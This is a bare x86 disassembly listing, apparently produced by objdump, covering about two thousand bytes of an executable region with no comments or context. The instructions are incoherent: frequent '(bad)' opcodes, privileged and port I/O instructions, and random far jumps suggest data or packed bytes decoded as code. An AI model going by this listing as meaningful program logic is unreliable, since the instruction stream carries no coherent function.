  42009f:	les    esi,FWORD PTR [esi+0x6bfce28d]
  4200a5:	push   esp
  4200a6:	add    eax,0xc4dc6b68
  4200ab:	cli    
  4200ac:	pushf  
  4200ad:	adc    eax,0x50a7a247
  4200b2:	inc    BYTE PTR [ebp+0x5c1a60b]
  4200b8:	aaa    
  4200b9:	sbb    eax,0xa88700
  4200be:	enter  0xf677,0x61
  4200c2:	mov    ebx,0x2fcc46b4
  4200c7:	test   DWORD PTR [esi+0x58f408cb],esp
  4200cd:	push   0x8
  4200cf:	aaa    
  4200d0:	fiadd  DWORD PTR [ebp+0x6ab332d2]
  4200d6:	sti    
  4200d7:	sub    WORD PTR [edx],dx
  4200da:	into   
  4200db:	mov    WORD PTR [eax+0x63],?
  4200de:	pop    ebx
  4200df:	push   0xb01a4f35
  4200e4:	push   cs
  4200e5:	imul   ebx,DWORD PTR [esi],0x6ed6dbda
  4200eb:	sbb    eax,0x6ef7b84
  4200f0:	ret    
  4200f1:	push   eax
  4200f2:	aam    0x69
  4200f4:	xchg   BYTE PTR [eax+0x6a],dh
  4200f7:	jecxz  0x42013b
  4200f9:	test   edi,edi
  4200fb:	fs ds jge 0x420083
  4200ff:	test   al,0xd8
  420101:	push   eax
  420102:	(bad)  [ebp+0x32b60e0e]
  420108:	pop    edi
  420109:	retf   0xbb05
  42010c:	mov    dh,0x4b
  42010e:	fcmovnbe st,st(6)
  420110:	icebp  
  420111:	or     eax,0x5e325fc2
  420116:	loopne 0x42018d
  420118:	in     al,dx
  420119:	gs scas eax,DWORD PTR es:[edi]
  42011b:	fcomp  st(2)
  42011d:	mov    ds,edx
  42011f:	push   esi
  420120:	into   
  420121:	dec    eax
  420122:	sbb    ebx,DWORD PTR [eax+0x5b361dc8]
  420128:	inc    edi
  420129:	pop    esp
  42012a:	ss gs fwait
  42012d:	mov    ecx,0xe09a6eb5
  420132:	and    ebx,DWORD PTR [ebx]
  420134:	pop    ebx
  420135:	sbb    ecx,DWORD PTR [ebx]
  420137:	fs mov ch,0xba
  42013a:	rol    BYTE PTR [edi],1
  42013c:	div    dh
  42013e:	fnsave [esi+0x11]
  420141:	cmp    eax,DWORD PTR [edx+0x41c1974e]
  420147:	sbb    DWORD PTR [eax+0x8eadd24],edi
  42014d:	fdivr  DWORD PTR [ebp-0x33]
  420150:	jge    0x420100
  420152:	call   0xd54810a
  420157:	shl    BYTE PTR [esi-0x53f4f520],0xc
  42015e:	out    dx,eax
  42015f:	mov    dl,0x0
  420161:	test   ebx,ebx
  420163:	ret    0x4340
  420166:	push   0x18bb344
  42016b:	xor    al,0x6a
  42016d:	imul   ebx,DWORD PTR [ebx+0x5e],0x35
  420171:	push   esi
  420172:	sub    DWORD PTR [ebp-0x7193d3b8],eax
  420178:	push   ss
  420179:	fs cmp al,0x8
  42017c:	inc    ebp
  42017d:	jae    0x42013c
  42017f:	lods   eax,DWORD PTR ds:[esi]
  420180:	adc    DWORD PTR [ebx+ecx*1-0x3e9713e8],edx
  420187:	jmp    0xda680479
  42018c:	scas   eax,DWORD PTR es:[edi]
  42018d:	push   esp
  42018e:	pop    ss
  42018f:	adc    BYTE PTR [ecx],bh
  420191:	pop    ecx
  420192:	fdivr  QWORD PTR [edi+0xb6edb52]
  420198:	add    esp,DWORD PTR [di+0x69]
  42019c:	icebp  
  42019d:	add    ch,bl
  42019f:	dec    ebp
  4201a0:	bound  edi,QWORD PTR [ebx-0x393d006b]
  4201a6:	hlt    
  4201a7:	lds    eax,FWORD PTR ss:[eax]
  4201aa:	jns    0x42012c
  4201ac:	add    BYTE PTR [edx-0x2],dh
  4201af:	imul   esi,DWORD PTR [edi-0x77],0xffffffa4
  4201b3:	mov    al,0x2d
  4201b5:	mov    ch,0x5b
  4201b7:	jecxz  0x42016f
  4201b9:	mov    edi,0x80622998
  4201be:	xor    esi,DWORD PTR [eax+0x1fb5b944]
  4201c4:	repnz or eax,0x2b9aae33
  4201ca:	jmp    0xc28a:0x9db8d856
  4201d1:	imul   ebx,DWORD PTR [ecx-0x57c6ca93],0x3adb6dc0
  4201db:	and    DWORD PTR [ebx],edi
  4201dd:	push   eax
  4201de:	jne    0x420239
  4201e0:	mov    esi,0x6dbe3e7d
  4201e5:	add    eax,0xcd1f342e
  4201ea:	cmp    al,al
  4201ec:	adc    eax,0x37d9ad9c
  4201f1:	call   0xda9e2ff8
  4201f6:	icebp  
  4201f7:	or     al,0x35
  4201f9:	ds xchg ebx,eax
  4201fb:	cmp    DWORD PTR [ebx-0x73],ebx
  4201fe:	sub    BYTE PTR [ebp-0x7a],ch
  420201:	aas    
  420202:	jecxz  0x4201d2
  420204:	jbe    0x42024c
  420206:	lea    eax,[ebp-0x16f0fd25]
  42020c:	xchg   ch,dh
  42020e:	shr    DWORD PTR [eax+esi*8-0x2f47a410],1
  420215:	outs   dx,BYTE PTR ds:[esi]
  420216:	dec    dl
  420218:	cmc    
  420219:	push   ebx
  42021a:	cmp    eax,0x704cf6a9
  42021f:	mov    DWORD PTR [edi-0x769df14a],esi
  420225:	iret   
  420226:	fldenv [eax]
  420228:	in     eax,0xf4
  42022a:	les    ebp,FWORD PTR [edx+ebx*8]
  42022d:	pop    edx
  42022e:	fimul  DWORD PTR [edx]
  420230:	mov    eax,0x841a1cec
  420235:	adc    dl,0xb6
  420238:	pop    ebp
  420239:	pop    eax
  42023a:	fdiv   DWORD PTR [esi-0x67]
  42023d:	push   edx
  42023e:	cmp    DWORD PTR [ebx+0x18f2d7bc],0x65
  420245:	mov    bh,0x85
  420247:	test   DWORD PTR [ebp+0x5f316022],eax
  42024d:	jmp    0x420242
  42024f:	pop    edi
  420250:	enter  0xdbad,0x42
  420254:	or     ebp,DWORD PTR [eax+0x38]
  420257:	jne    0x42020e
  420259:	mov    edi,0x70ad97aa
  42025e:	imul   eax,DWORD PTR [ecx],0xffffffea
  420261:	push   cs
  420262:	mov    eax,ds:0x535c2287
  420267:	aaa    
  420268:	mov    dh,0xb6
  42026a:	pop    es
  42026b:	adc    DWORD PTR [eax+0x251e412e],esp
  420271:	leave  
  420272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420273:	sar    DWORD PTR [eax-0x3d53246b],1
  420279:	inc    edi
  42027a:	xchg   esp,eax
  42027b:	push   cs
  42027c:	std    
  42027d:	enter  0x2806,0xb5
  420281:	push   es
  420282:	mov    cl,0x9c
  420284:	mov    ds:0xb69da7f6,eax
  420289:	ins    DWORD PTR es:[edi],dx
  42028a:	ins    BYTE PTR es:[edi],dx
  42028b:	adc    eax,0x4e4be27b
  420290:	and    ebx,DWORD PTR [eax-0x4ab4e597]
  420296:	dec    ebx
  420297:	fucomi st,st(0)
  420299:	or     dh,dl
  42029b:	imul   ecx,DWORD PTR ds:[edx],0x5
  42029f:	dec    ebx
  4202a0:	push   DWORD PTR [ebp+eax*4+0x30040b1b]
  4202a7:	mov    bh,0x31
  4202a9:	sbb    al,0x79
  4202ab:	pusha  
  4202ac:	mov    esp,0x2c6ed6ed
  4202b1:	les    edx,FWORD PTR [esi+0x3c]
  4202b4:	fnsave [esi+0x7b822392]
  4202ba:	sbb    ch,BYTE PTR [ebp-0x64b4eb56]
  4202c0:	mov    cs,WORD PTR ds:0x5c25c22c
  4202c6:	mov    ch,0x6f
  4202c8:	dec    edx
  4202c9:	xor    bl,BYTE PTR [ecx]
  4202cb:	loopne 0x42030a
  4202cd:	mov    eax,0xc2b76b6d
  4202d2:	addr16 dec edi
  4202d4:	sub    ebx,edx
  4202d6:	pop    eax
  4202d7:	jge    0x420317
  4202d9:	sbb    eax,0x535bb44
  4202de:	fistp  DWORD PTR [ecx-0x4]
  4202e1:	pop    ecx
  4202e2:	push   0x991a728d
  4202e7:	cs ds cs xchg esp,eax
  4202eb:	jg     0x42034f
  4202ed:	pop    eax
  4202ee:	ins    DWORD PTR es:[edi],dx
  4202ef:	mov    ah,0x47
  4202f1:	add    BYTE PTR [eax+ecx*4+0x76],ch
  4202f5:	xchg   esp,eax
  4202f6:	dec    ebx
  4202f7:	pop    ebp
  4202f8:	jmp    0x343d:0x4df71608
  4202ff:	pop    edi
  420300:	mov    al,0x92
  420302:	push   esp
  420303:	fcmovnbe st,st(6)
  420305:	mov    dh,0xd7
  420307:	ror    BYTE PTR [ebx+esi*8+0x62d79761],1
  42030e:	adc    eax,0x8cd6ea0e
  420313:	adc    BYTE PTR [ebx-0x2],0x9e
  420317:	cmp    esp,esi
  420319:	lea    esi,[esi]
  42031b:	cs ins DWORD PTR es:[edi],dx
  42031d:	mov    dh,0xf2
  42031f:	cmp    DWORD PTR [ecx+0x28007a19],edx
  420325:	repnz in eax,dx
  420327:	mov    dh,0xb5
  420329:	push   ss
  42032a:	xlat   BYTE PTR ds:[ebx]
  42032b:	sbb    eax,0x55181712
  420330:	add    dh,dl
  420332:	add    BYTE PTR [eax],bh
  420334:	rcl    BYTE PTR ds:0xa0cb2f96,0x7d
  42033b:	rol    BYTE PTR [eax],cl
  42033d:	sbb    BYTE PTR [eax+0x74510d9a],dh
  420343:	mov    ah,0xb0
  420345:	aam    0xe3
  420347:	cs mov bh,0x6a
  42034a:	xor    al,0xed
  42034c:	push   edx
  42034d:	pop    ebx
  42034e:	ficomp DWORD PTR [ebx+0x410202c9]
  420354:	outs   dx,BYTE PTR ds:[esi]
  420355:	sbb    esp,0x5e
  420358:	sub    DWORD PTR [ebp+0x69],0xffffffa9
  42035c:	push   esp
  42035d:	jge    0x4202f4
  42035f:	dec    edx
  420360:	mov    al,0x1b
  420362:	mov    DWORD PTR [ebx+0x1],ebx
  420365:	push   0x2220d6b7
  42036a:	lds    edi,FWORD PTR [ecx-0x261a731f]
  420370:	mov    eax,0x1acb6d6d
  420375:	cmp    BYTE PTR [edx+0x3f4ac2d4],0x5e
  42037c:	mov    cl,0xed
  42037e:	mov    BYTE PTR [ebp-0x5e],ch
  420381:	out    dx,eax
  420382:	aas    
  420383:	in     al,dx
  420384:	retf   0x4af0
  420387:	dec    esp
  420388:	inc    esp
  420389:	adc    al,0x2e
  42038b:	cmp    al,0x6a
  42038d:	in     al,dx
  42038e:	mov    esi,DWORD PTR [edx-0x7224d1ca]
  420394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420395:	lods   eax,DWORD PTR ds:[esi]
  420396:	push   0xab23bf14
  42039b:	adc    eax,0x761dbb04
  4203a0:	sbb    ebx,DWORD PTR [edi]
  4203a2:	pop    ebx
  4203a3:	or     ebp,DWORD PTR [esi]
  4203a5:	cmp    DWORD PTR [edx],0xfbe2ac8
  4203ab:	ss sub eax,0x24808e45
  4203b1:	(bad)  
  4203b2:	mov    esp,0xd70da523
  4203b7:	mov    dh,0x35
  4203b9:	jge    0x4203cc
  4203bb:	push   ds
  4203bc:	xchg   ecx,eax
  4203bd:	repz loope 0x4203be
  4203c0:	inc    esi
  4203c1:	(bad)  [edx-0x795bd35b]
  4203c7:	and    BYTE PTR [esi],0xb3
  4203ca:	arpl   sp,ax
  4203cc:	ret    0xc2c2
  4203cf:	in     al,0x2e
  4203d1:	mov    DWORD PTR [edx-0x56a5e960],0xd0d4a170
  4203db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203dc:	jge    0x4203f7
  4203de:	lods   eax,DWORD PTR ds:[esi]
  4203df:	mov    ecx,0xb69656a3
  4203e4:	fisubr DWORD PTR [ebp+0x1d]
  4203e7:	inc    esp
  4203e8:	fiadd  WORD PTR [ebx+0x170d582c]
  4203ee:	daa    
  4203ef:	pusha  
  4203f0:	fist   DWORD PTR [esi+0x350f0296]
  4203f6:	out    0xb3,eax
  4203f8:	(bad)  
  4203f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203fa:	push   edi
  4203fb:	test   al,0xb6
  4203fd:	xor    eax,0x3505bd35
  420402:	and    BYTE PTR [ebx+0x40a1617d],0xb4
  420409:	xchg   DWORD PTR [esi-0x24],ebx
  42040c:	es xchg ecx,eax
  42040e:	and    eax,0x8c9b956e
  420413:	push   eax
  420414:	push   ebp
  420415:	jae    0x42045b
  420417:	pop    es
  420418:	push   ss
  420419:	pop    eax
  42041a:	sub    BYTE PTR [esp+esi*4],al
  42041d:	push   ss
  42041e:	push   esi
  42041f:	ret    
  420420:	mov    ds:0xb6da38f4,eax
  420425:	fst    QWORD PTR [esi+0x18bc0a65]
  42042b:	inc    edi
  42042c:	aaa    
  42042d:	outs   dx,BYTE PTR ds:[esi]
  42042e:	imul   ebp,DWORD PTR [edi],0x51bb42d
  420434:	mov    WORD PTR [ebp+0xbb101d1],?
  42043a:	mov    cl,0x10
  42043c:	add    bl,bl
  42043e:	lea    esi,[esi]
  420440:	xchg   esi,eax
  420441:	mov    ds:0x10904b78,al
  420446:	fs dec esi
  420448:	jmp    0x196e322c
  42044d:	push   0xffffffc2
  42044f:	and    BYTE PTR [eax+ebp*1+0x5b1bd53d],ah
  420456:	mov    ebx,0xef2602b4
  42045b:	pop    esp
  42045c:	mov    al,0x74
  42045e:	and    BYTE PTR [ecx-0x15a36d1c],cl
  420464:	sub    ch,BYTE PTR [esi+0x5]
  420467:	sub    BYTE PTR [edi],cl
  420469:	test   al,0x5c
  42046b:	cmc    
  42046c:	popa   
  42046d:	jecxz  0x42047d
  42046f:	push   0xf1546c53
  420474:	loop   0x4204b7
  420476:	scas   al,BYTE PTR es:[edi]
  420477:	fcomp  QWORD PTR [eax+ebx*2-0x26]
  42047b:	ficom  DWORD PTR [edi-0x29]
  42047e:	aam    0xb6
  420480:	inc    ebp
  420481:	out    dx,eax
  420482:	inc    edx
  420483:	mov    ecx,DWORD PTR [ebx]
  420485:	sub    BYTE PTR [ebx-0x25],0xad
  420489:	sub    eax,0x980bc3d3
  42048e:	xor    dl,ah
  420490:	push   cs
  420491:	cdq    
  420492:	or     eax,DWORD PTR [ecx+edi*8-0x53]
  420496:	lea    esi,[edx-0x3e]
  420499:	mov    ecx,0xcad3a1b4
  42049e:	xchg   BYTE PTR [eax],al
  4204a0:	popf   
  4204a1:	push   edi
  4204a2:	sbb    ecx,DWORD PTR [ebx]
  4204a4:	pop    ebx
  4204a5:	ins    DWORD PTR es:[edi],dx
  4204a6:	dec    edi
  4204a7:	dec    ebp
  4204a8:	int    0x37
  4204aa:	adc    BYTE PTR [edx],bl
  4204ac:	lahf   
  4204ad:	in     eax,0x8a
  4204af:	or     ebx,DWORD PTR [ebx]
  4204b1:	or     ecx,DWORD PTR [eax-0x5c27ea7b]
  4204b7:	icebp  
  4204b8:	inc    edx
  4204b9:	mov    esi,0xa06b6174
  4204be:	test   eax,0x6773bac8
  4204c3:	(bad)  
  4204c5:	rol    DWORD PTR [eax],1
  4204c7:	adc    BYTE PTR cs:[ebp+0xe],ch
  4204cb:	sbb    dl,BYTE PTR [eax-0x49]
  4204ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204d0:	sahf   
  4204d1:	pop    ebx
  4204d2:	mov    ecx,0x7f7d2ed1
  4204d7:	aad    0x59
  4204d9:	xor    ebp,DWORD PTR ds:0xe1302f0e
  4204df:	mov    dh,0xb5
  4204e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204e2:	push   es
  4204e3:	sbb    eax,0x98321d41
  4204e8:	inc    ecx
  4204e9:	inc    esp
  4204ea:	push   ecx
  4204eb:	push   ss
  4204ec:	or     ebx,DWORD PTR [ebx-0x1f]
  4204ef:	inc    esi
  4204f0:	push   ds
  4204f1:	sub    dl,BYTE PTR [ebx]
  4204f3:	xchg   edi,eax
  4204f4:	loopne 0x420496
  4204f6:	pop    ds
  4204f7:	repnz mov al,ds:0xfd0bb6a1
  4204fd:	adc    DWORD PTR [ebx+0x35f7f6a7],0x596176c4
  420507:	mov    cl,0x86
  420509:	pop    ecx
  42050a:	xor    DWORD PTR [edx-0x3c],ebp
  42050d:	ja     0x420581
  42050f:	mov    ebx,0x52f83e99
  420514:	or     eax,0x7a5d65d4
  420519:	out    0x37,al
  42051b:	cmp    eax,0x56db5b08
  420520:	imul   ecx,DWORD PTR [edi+0x3213dc22],0x77
  420527:	pop    ds
  420528:	outs   dx,DWORD PTR ds:[esi]
  420529:	outs   dx,BYTE PTR ds:[esi]
  42052a:	shr    DWORD PTR [esi+0x4b],1
  42052d:	cmp    edi,DWORD PTR [ebp+0x2c]
  420530:	jnp    0x4204d7
  420532:	sti    
  420533:	xor    ecx,DWORD PTR [eax]
  420535:	xor    ebx,DWORD PTR [eax+ebp*2+0x0]
  420539:	ss scas al,BYTE PTR es:[edi]
  42053b:	sbb    eax,0x91433851
  420540:	dec    ecx
  420541:	pop    eax
  420542:	push   0x9770285c
  420547:	and    esp,esp
  420549:	and    al,0xdc
  42054b:	push   cs
  42054c:	pop    ebx
  42054d:	adc    ebx,DWORD PTR [ebp+0x5a]
  420550:	retf   0x1256
  420553:	jp     0x4205c9
  420555:	xchg   DWORD PTR [ecx],edi
  420557:	push   eax
  420558:	push   esi
  420559:	dec    ebx
  42055a:	mov    es,WORD PTR [esi-0x435d9080]
  420560:	in     al,0x26
  420562:	in     eax,dx
  420563:	aaa    
  420564:	(bad)  
  420566:	mov    DWORD PTR [edx-0x5d],edx
  420569:	adc    al,0x98
  42056b:	int    0x53
  42056d:	xchg   ebp,eax
  42056e:	push   ecx
  42056f:	out    dx,eax
  420570:	dec    eax
  420571:	ins    BYTE PTR es:[edi],dx
  420572:	xchg   esp,eax
  420573:	or     ecx,ebx
  420575:	add    BYTE PTR [edi+0x50f564ae],bh
  42057b:	mov    cl,0xb2
  42057d:	mov    ds,WORD PTR [edx-0x2d]
  420580:	mov    dh,0x40
  420582:	repnz xchg ecx,eax
  420584:	sub    al,0x2a
  420586:	pop    edi
  420587:	aaa    
  420588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420589:	and    eax,0x8f9601a2
  42058e:	loope  0x420549
  420590:	cs xor eax,0x54318db6
  420596:	xor    BYTE PTR [esi-0x12],dl
  420599:	iret   
  42059a:	and    DWORD PTR [esi+0x644b1bb0],0x20
  4205a1:	mov    ah,bh
  4205a3:	xchg   ebp,eax
  4205a4:	adc    eax,0xd6ed6dde
  4205a9:	outs   dx,BYTE PTR ds:[esi]
  4205aa:	jno    0x4205bd
  4205ac:	cmc    
  4205ad:	pop    edi
  4205ae:	pop    ss
  4205af:	dec    esi
  4205b0:	in     eax,0x89
  4205b2:	mov    dh,0x4e
  4205b4:	sbb    ebx,DWORD PTR [ebx]
  4205b6:	dec    ebx
  4205b7:	sub    al,0xb
  4205b9:	push   es
  4205ba:	cmp    ch,dh
  4205bc:	or     DWORD PTR [edx],eax
  4205be:	pop    ebp
  4205bf:	(bad)  
  4205c0:	les    eax,FWORD PTR [edx]
  4205c2:	or     ebx,DWORD PTR [ebx]
  4205c4:	aas    
  4205c5:	or     BYTE PTR [ebp+eax*8-0x5e],0x53
  4205ca:	fild   DWORD PTR [esi]
  4205cc:	shl    BYTE PTR [esi+0x2a471604],0xde
  4205d3:	push   cs
  4205d4:	xor    eax,0xab42eda1
  4205d9:	push   0xa1ee5a53
  4205de:	loop   0x4205d2
  4205e0:	mov    ch,0x5b
  4205e2:	mov    ebx,0x83cbec6d
  4205e7:	cmp    ebx,DWORD PTR [ebx+0x68]
  4205ea:	pop    ss
  4205eb:	and    al,0x9
  4205ed:	mov    ebp,gs
  4205ef:	ret    0xb6d2
  4205f2:	push   esi
  4205f3:	(bad)  
  4205f4:	lahf   
  4205f5:	xor    ecx,DWORD PTR [edi-0x16dfefd9]
  4205fb:	in     al,dx
  4205fc:	mov    dh,0xa7
  4205fe:	push   ss
  4205ff:	outs   dx,BYTE PTR ds:[esi]
  420600:	mov    dh,0xb3
  420602:	test   ch,bh
  420604:	adc    BYTE PTR [esi-0x4861a61a],ch
  42060a:	pop    ss
  42060b:	mov    cl,0xdd
  42060d:	sbb    eax,0x53778e16
  420612:	and    al,BYTE PTR ds:0xd855262
  420618:	rcl    BYTE PTR [esi*4+0x36010941],0x14
  420620:	fcmovnb st,st(2)
  420622:	xchg   ebx,eax
  420623:	fidiv  WORD PTR [ecx+ebx*1]
  420626:	or     dh,cl
  420628:	adc    eax,0x8ad1a6d8
  42062d:	xchg   esi,eax
  42062e:	pop    ss
  42062f:	test   esi,0xcda2cd00
  420635:	mov    esi,0x7bb0b1b8
  42063a:	sti    
  42063b:	pop    es
  42063c:	push   ebp
  42063d:	push   edi
  42063e:	hlt    
  42063f:	std    
  420640:	xchg   ebx,ebp
  420642:	loopne 0x42061a
  420644:	push   ebp
  420645:	fucom  st(0)
  420647:	add    eax,0xcb46e67a
  42064c:	sti    
  42064d:	enter  0xbb42,0x54
  420651:	mov    ah,BYTE PTR cs:[ecx-0x44d9c2ee]
  420658:	or     ebx,DWORD PTR [ebx]
  42065a:	pop    ebx
  42065b:	rcr    DWORD PTR [esi],1
  42065d:	and    BYTE PTR [edx],0xfc
  420660:	cwde   
  420661:	loop   0x42069b
  420663:	pop    ebx
  420664:	inc    ebx
  420665:	ins    DWORD PTR es:[edi],dx
  420666:	ins    DWORD PTR es:[edi],dx
  420667:	mov    DWORD PTR [ecx-0x2d],esi
  42066a:	fld    DWORD PTR [edx-0x4b7285f8]
  420670:	sub    eax,0xd363002d
  420675:	pop    esp
  420676:	and    al,0xbc
  420678:	data16 sub bh,bh
  42067b:	test   DWORD PTR [esi+0x166e0580],esi
  420681:	nop
  420682:	pop    ss
  420683:	add    BYTE PTR [esp+edx*1+0x0],cl
  420687:	aad    0x2
  420689:	cld    
  42068a:	inc    edx
  42068b:	mov    ebx,DWORD PTR [eax+0x49]
  42068e:	dec    edi
  42068f:	sbb    al,0xe2
  420691:	test   DWORD PTR [eax+0x0],0xd01d5edf
  420698:	lods   eax,DWORD PTR ds:[esi]
  420699:	mov    cl,0x75
  42069b:	call   DWORD PTR [ebp-0x448c8af0]
  4206a1:	lock add DWORD PTR [ebp-0x421a1da5],0x6a
  4206a9:	leave  
  4206aa:	sti    
  4206ab:	add    DWORD PTR [eax],edi
  4206ad:	or     ecx,DWORD PTR [ebp+0x4def436d]
  4206b3:	and    BYTE PTR [edx+eax*8+0x0],dh
  4206b7:	retf   0x6874
  4206ba:	ins    DWORD PTR es:[edi],dx
  4206bb:	inc    ecx
  4206bc:	or     edx,esi
  4206be:	cdq    
  4206bf:	retf   
  4206c0:	clc    
  4206c1:	cmp    eax,0xdda05a5c
  4206c6:	js     0x42068c
  4206c8:	dec    ebx
  4206c9:	add    eax,0x5268d1a2
  4206ce:	repz das 
  4206d0:	ins    BYTE PTR es:[edi],dx
  4206d1:	mov    ah,0x3e
  4206d3:	div    DWORD PTR [ecx-0x65]
  4206d6:	jbe    0x4206a7
  4206d8:	pop    ss
  4206d9:	mov    ?,WORD PTR [esi]
  4206db:	jp     0x4206dd
  4206dd:	mov    es,WORD PTR [eax+0x62fbca26]
  4206e3:	shl    DWORD PTR [ebx+0x5f],cl
  4206e6:	sbb    eax,0xb7a58dd0
  4206eb:	mov    esp,0xd8263fc7
  4206f0:	scas   eax,DWORD PTR es:[edi]
  4206f1:	mov    eax,ds:0x4285c01
  4206f6:	xlat   BYTE PTR ds:[ebx]
  4206f7:	sub    BYTE PTR [esi+0x1b],dh
  4206fa:	rol    edx,cl
  4206fc:	inc    edx
  4206fd:	add    ebp,DWORD PTR [eax+0x147e88c]
  420703:	cmp    ah,BYTE PTR [edi+0x36a8d1b6]
  420709:	and    edi,DWORD PTR [edi-0x40369f8d]
  42070f:	sub    esp,DWORD PTR [eax-0x580924fb]
  420715:	out    0x40,eax
  420717:	push   DWORD PTR [ebp+edx*2+0x4a5c5bb5]
  42071e:	inc    ebx
  42071f:	cmc    
  420720:	cmp    ebx,DWORD PTR [edi+0x4d6db0bb]
  420726:	arpl   WORD PTR [edx],bp
  420728:	add    ch,BYTE PTR [edi]
  42072a:	inc    ecx
  42072b:	inc    ebx
  42072c:	fld    DWORD PTR [edx-0x24]
  42072f:	jge    0x4206ec
  420731:	sub    eax,0x49c55b6d
  420736:	or     BYTE PTR ds:0x3b92b008,ah
  42073c:	in     eax,0xe
  42073e:	lods   eax,DWORD PTR ds:[esi]
  42073f:	xor    eax,0xa7cc6db6
  420744:	into   
  420745:	push   eax
  420746:	(bad)  
  420747:	arpl   WORD PTR [esp+edx*2],bp
  42074a:	stos   DWORD PTR es:[edi],eax
  42074b:	jo     0x4207a8
  42074d:	push   0x294b1f32
  420752:	sbb    bl,bl
  420754:	mov    ch,0x3d
  420756:	je     0x4206fb
  420758:	jno    0x4207bb
  42075a:	call   0xa8d5:0xab64a31c
  420761:	test   BYTE PTR [edx],0x97
  420764:	sub    BYTE PTR [edi],dl
  420766:	mov    bl,0x19
  420768:	nop
  420769:	sub    DWORD PTR [ebx+0x376c1435],ecx
  42076f:	outs   dx,DWORD PTR ds:[esi]
  420770:	dec    esi
  420771:	or     esi,DWORD PTR [ecx+0x11]
  420774:	xchg   esp,eax
  420775:	xchg   edx,eax
  420776:	push   eax
  420777:	pop    ecx
  420778:	mov    eax,0x164a62b0
  42077d:	xchg   BYTE PTR [eax],bh
  42077f:	jo     0x420799
  420781:	ins    DWORD PTR es:[edi],dx
  420782:	mov    bh,0x16
  420784:	sbb    ah,BYTE PTR [edi-0x39]
  420787:	lds    ebp,FWORD PTR [ebx]
  420789:	(bad)  
  42078a:	dec    esi
  42078b:	add    eax,0xb616020c
  420790:	lods   eax,DWORD PTR ds:[esi]
  420791:	sub    ecx,ebp
  420793:	ret    
  420794:	sub    al,0xd2
  420796:	fmul   st(2),st
  420798:	outs   dx,BYTE PTR ds:[esi]
  420799:	xchg   esp,eax
  42079a:	sub    eax,0x633ff496
  42079f:	aas    
  4207a0:	or     al,0xf9
  4207a2:	outs   dx,DWORD PTR ds:[esi]
  4207a3:	fidiv  DWORD PTR [esi-0x5ed92913]
  4207a9:	clc    
  4207aa:	imul   esp,eax,0xe9a14761
  4207b0:	in     eax,dx
  4207b1:	dec    ebx
  4207b2:	mov    ah,0x41
  4207b4:	pop    ebx
  4207b5:	sahf   
  4207b6:	out    dx,al
  4207b7:	ret    0x210e
  4207ba:	push   esp
  4207bb:	out    0xd4,eax
  4207bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207be:	test   DWORD PTR [esi],eax
  4207c0:	mov    bl,0xfd
  4207c2:	push   0x6b
  4207c4:	lahf   
  4207c5:	call   0x4dd4:0x1db6946d
  4207cc:	sub    BYTE PTR [eax],ah
  4207ce:	lods   eax,DWORD PTR ds:[esi]
  4207cf:	push   ebx
  4207d0:	arpl   WORD PTR [ebx+0x5d],di
  4207d3:	js     0x420837
  4207d5:	mov    ebx,0x17a57ee0
  4207da:	mov    edx,0x5122146a
  4207df:	mov    cl,0x60
  4207e2:	pop    eax
  4207e3:	sub    bh,BYTE PTR [eax]
  4207e5:	mov    dh,0x2e
  4207e7:	pop    eax
  4207e8:	cs call 0x3747:0x61697685
  4207f0:	push   edi
  4207f1:	mov    ecx,0x19c8409d
  4207f6:	fnsave [esi]
  4207f8:	fisub  DWORD PTR ss:[ebp-0x4e]
  4207fc:	retf   
  4207fd:	mov    ds:0x4d156f1e,al
  420802:	or     al,0xfb
  420804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420806:	jbe    0x4207a9
  420808:	enter  0xcb85,0x71
  42080c:	imul   ebp,DWORD PTR [edi],0xffffffed
  42080f:	push   cs
  420810:	inc    esi
  420811:	mov    al,0xf4
  420813:	aam    0x5b
  420815:	mov    edx,0xbf849cc
  42081a:	cmp    cl,BYTE PTR [ebx+ebx*1-0x1b]
  42081e:	mov    bh,0xb
  420820:	xor    al,0xaa
  420822:	add    BYTE PTR [esi-0x7a],bh
  420825:	push   esp
  420826:	das    
  420827:	(bad)  
  420828:	fcmovu st,st(2)
  42082a:	lods   eax,DWORD PTR ds:[esi]
  42082b:	fnsave ds:0x831da8c5
  420831:	xor    edx,ecx
  420833:	and    BYTE PTR [ebp+0x27],cl
  420836:	shr    DWORD PTR [ebp+0x5b],cl
  420839:	(bad)  
  42083b:	sub    DWORD PTR [ebx-0x522ddfc3],ebx
  420841:	and    BYTE PTR [edi+0x16db8d71],dl
  420847:	in     eax,dx
  420848:	add    dh,BYTE PTR [eax+0x35193f11]
  42084e:	es mov ebx,0x8eb7cb00
  420854:	xor    BYTE PTR [eax+0x62],0x37
  420858:	and    BYTE PTR [esp+eax*4],cl
  42085b:	add    BYTE PTR [esi+0x5],ch
  42085e:	mov    dh,0x5b
  420860:	lods   eax,DWORD PTR ds:[esi]
  420861:	dec    ebx
  420862:	repnz rol BYTE PTR [edi+0x34],0xa3
  420867:	ds push ebx
  420869:	pop    ss
  42086a:	arpl   WORD PTR [ebp+0x2736dbf6],ax
  420870:	jmp    0xda196e7a
  420875:	pop    eax
  420876:	jp     0x420885
  420878:	pop    edi
  420879:	fst    QWORD PTR [esi]
  42087b:	mov    dh,0xea
  42087d:	jecxz  0x42084c
  42087f:	xchg   edi,eax
  420880:	shl    edx,cl
  420882:	xchg   ebp,eax
  420883:	dec    ebx
  420884:	mov    dh,0xc7
  420886:	frstpm(287 only) 
  420888:	pop    ebx
  420889:	sbb    edi,DWORD PTR [ecx]
  42088b:	inc    ebp
  42088c:	fldenv [esi-0x705fffcc]
  420892:	dec    esi
  420893:	sbb    dh,BYTE PTR [esp+esi*4-0x53]
  420897:	imul   edi,ecx,0x429b00
  42089d:	mov    ss,edx
  42089f:	sub    DWORD PTR [ebx-0x5f],ebx
  4208a2:	jl     0x42084b
  4208a4:	mov    ah,0x3
  4208a6:	mov    edx,0x2ffcf72d
  4208ab:	loop   0x420901
  4208ad:	dec    edi
  4208ae:	lock jle 0x420831
